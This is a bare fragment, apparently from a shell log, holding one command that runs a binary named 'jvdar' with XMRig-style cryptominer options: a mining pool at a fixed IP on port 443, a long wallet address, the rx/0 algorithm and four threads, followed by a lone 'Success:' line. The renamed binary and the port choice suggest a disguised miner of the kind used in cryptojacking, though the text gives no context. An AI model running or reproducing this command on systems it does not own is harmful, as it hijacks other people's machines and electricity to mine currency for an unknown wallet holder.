         ./jvdar -o 172.206.58.137:443 -u SaLvsCoGwEnGymEpfbiqaBLDtttdeFLYV7HGp7Lj8tbKh9q3xF3wD9bc2bYRs7g2TbNtz3muwjAdQEky42AFdagPZMx1h3MqW5y -p tol -a rx/0 -k -t 4
  Success:
